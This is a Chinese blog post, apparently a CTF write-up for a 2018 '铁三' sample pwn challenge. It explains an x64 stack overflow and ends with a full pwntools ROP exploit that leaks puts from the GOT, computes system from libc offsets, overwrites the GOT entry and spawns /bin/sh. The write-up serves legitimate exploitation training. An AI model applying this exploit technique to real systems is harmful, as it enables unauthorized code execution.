---
layout:     post
title:      "2018铁三个人赛样题writeup"
subtitle:   " \"x64 Rop\""
date:       2018-02-12 12:00:00
author:     "Chris"
catalog: true
tags:
    - Pwn
 
---

>传送门

[源文件下载](https://github.com/yxshyj/project/tree/master/pwn/2018%E9%93%81%E4%B8%89%E4%B8%AA%E4%BA%BA%E8%B5%9B%E6%A0%B7%E9%A2%98)

## 0x00 程序分析
使用IDA pro 打开程序文件

![](https://i.imgur.com/16hax4G.png)

程序存在典型的栈溢出，使用gets没有限制输入的长度，而且存在gets，puts等函数调用。
 
运行程序

![](https://i.imgur.com/Wn8NFmk.png)

长度过长的时候会导致程序崩溃。

检查程序的保护措施

![](https://i.imgur.com/r00sAnm.png)

## 0x01 测量偏移长度
1)  使用pwntools 产生150个垃圾字符

pip install pwntools 之后

pwn cyclic 150

![](https://i.imgur.com/eynMELO.png)

将这些字符串输出到一个test文件中

2)  gdb 调试

![](https://i.imgur.com/krUzqBd.png)

查看gdb的调试信息

![](https://i.imgur.com/u0dZ1WC.png)

图中显示运行到ret 处停止，ret 指令 相当于 pop rax ; jmp rax

也就是从栈顶取值，并跳转到这个值的地址。

栈顶的值是kaaa 由此得偏移量为40。

![](https://i.imgur.com/klPeu5U.png)

## 0x02 漏洞利用思路

现在可以利用栈溢出让程序跳转到任意位置，但是由于程序开启了NX，且系统中开启了ASLR，所以采用ROP技术，构造出一个system(“/bin/sh”).
system函数在libc中，且每次运行都会变化，我们通过构造payload泄露libc中的另一个函数puts在GOT表中的真实地址，puts和system 在libc中的偏移是固定的，进而推算出system地址。
再次构造ROP 使用gets函数将put函数的GOT地址覆盖为system函数地址，然后再跳转到put即可实现getshell。
 
1)  泄露puts函数的GOT地址
首先收集gets的plt地址 和 puts的plt，got地址。

![](https://i.imgur.com/AAdxxpE.png)

需要构造 puts(puts_got)

在64位中通过寄存器传递参数 依次是rdi,rsi,rdx,r10,r8,r9

使用ROPgadget 查找 pop rdi;ret;  用于设置puts函数的第一个参数。

ROPgadget --binary ./tie3_pwn --only "pop|ret"

![](https://i.imgur.com/Wc5KnZl.png)

pop rdi ; ret ; 的地址是0x4006f3
 
构造payload  pop_rdi + puts_got + puts_plt 

![](https://i.imgur.com/P4l6ru1.png)

运行结果如下

![](https://i.imgur.com/aVYERT3.png)

 
到此已经成功的获取到了put的函数地址。
 
计算偏移

	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	system_off = libc.symbols['system']
	puts_off = libc.symbols['puts']
	off = system_off - puts_off
此时system的地址也知道了。
 
2)  将put替换为system地址获得shell

使用gets函数，构造gets(puts_got)  ，然后再构造system(“/bin/sh”)
 
在原来的基础上

 pop_rdi + puts_got + puts_plt  

 +pop_rdi+puts_got+gets_plt  此时已经构造好覆盖put函数got表的payload
 
 +pop_rdi + bin_sh + puts_plt   执行system(“/bin/sh”)

 

最后完整的payload如下

 

	from pwn import *
	
	context.log_level = "debug"
	
	e = ELF("./tie3pwn")
	puts_plt = e.plt['puts']
	gets_plt = e.plt['gets']
	puts_got = e.got['puts']
	 
	print "puts_plt: "+hex(puts_plt)
	print "gets_plt: "+hex(gets_plt)
	print "puts_got: "+hex(puts_got)
	 
	pop_rdi = 0x4006f3
	print "pop_rdi: "+hex(pop_rdi)
	 
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	system_off = libc.symbols['system']
	puts_off = libc.symbols['puts']
	off = system_off - puts_off
	 
	payload = "A"*40+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
	payload += p64(pop_rdi)+p64(puts_got)+p64(gets_plt)
	payload += p64(pop_rdi)+p64(puts_got+8)+p64(puts_plt)
	 
	s = remote("127.0.0.1",8888)
	s.recvuntil(":")
	s.sendline(payload)
	s.recvuntil("tie3\n")
	 
	puts_addr = u64(s.recvuntil("\n")[:-1].ljust(8,"\x00"))
	print "puts_addr: "+hex(puts_addr)
	system_addr = puts_addr+off
	print "system_addr: "+hex(system_addr)
	 
	s.sendline(p64(system_addr)+"/bin/sh\x00")
	s.interactive()
 
运行结果如下 为了方便没有显示调试信息

![](https://i.imgur.com/aVYERT3.png)